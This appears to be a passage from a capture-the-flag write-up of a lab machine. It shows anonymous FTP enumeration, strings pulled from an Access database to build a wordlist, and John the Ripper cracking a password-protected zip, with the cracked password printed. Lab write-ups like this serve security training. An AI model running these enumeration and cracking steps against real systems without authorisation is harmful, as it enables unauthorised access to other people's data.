
```sql
ftp anonymous@10.10.10.98

125 Data connection already open; Transfer starting.
08-23-18  09:16PM       <DIR>          Backups
125 Data connection already open; Transfer starting.
08-23-18  09:16PM              5652480 backup.mdb

08-24-18  10:00PM       <DIR>          Engineer
125 Data connection already open; Transfer starting.
!SWITCH TO binary mode here with 'binary'
08-24-18  01:16AM                10870 Access Control.zip

```

└─$ file backup.mdb          
backup.mdb: Microsoft Access Database

Access Control.zip has a password protection.

The following is revealed from using strings:
```
snip..
Wiegand66Q
Wiegand50Q
Wiegand37aR
Wiegand37Q
Wiegand36Q
Wiegand34aR
Wiegand34Q
Wiegand26aR
Wiegand26Q
..snip
```

Let's try these against the zip file.

```js
john --wordlist=potentialpasses.txt zip.hash             
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 128/128 SSE2 4x])
Cost 1 (HMAC size) is 10650 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
access4u@security (Access Control.zip/Access Control.pst)     
1g 0:00:00:00 DONE (2023-05-28 11:25) 9.090g/s 18618p/s 18618c/s 18618C/s Standard Jet DB..0g3n0U
Session completed. 
```
